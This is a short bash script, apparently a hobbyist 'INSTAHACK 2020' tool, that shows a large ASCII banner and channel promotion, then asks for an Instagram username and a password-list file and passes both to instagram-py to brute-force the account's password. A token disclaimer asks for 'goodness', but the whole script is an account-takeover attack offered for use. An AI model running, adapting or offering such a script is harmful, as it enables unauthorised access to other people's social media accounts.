#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
            
       ███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗░█████╗░██╗░░░░░
       ████╗░████║██╔══██╗████╗░██║██║░░░██║██╔══██╗██║░░░░░
       ██╔████╔██║███████║██╔██╗██║██║░░░██║███████║██║░░░░░
       ██║╚██╔╝██║██╔══██║██║╚████║██║░░░██║██╔══██║██║░░░░░
       ██║░╚═╝░██║██║░░██║██║░╚███║╚██████╔╝██║░░██║███████╗
       ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝

        ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
        ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
        ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
        ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
        ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
        ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
                [INSTAGRAM BRUTE FORCE HACK]
                [AUTHER : Anonymous h4cker7]
                [YOU TUBE : Hacker_terminal]
                [INSTAGRAM: hacker_terminal]
                  [TOOL NAME : INSTAHACK]
 
______________________[INSTAHACK 2020]__________________

PLEASE USE THIS SCRIPT FOR GOODNESS, NOT FOR BAD CRIMES,
          OTHERWISE YOU MAY RUN INTO PROBLEMS!
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "      \e[101m\e[1;77m  >>  This script is inspired by ighack  << \e[0m\n"
printf "\n"
printf " \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/Hacker_terminal \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 1.0
cd $HOME
fi
sleep 5.0
cd $HOME/instahack
bash instahack.sh
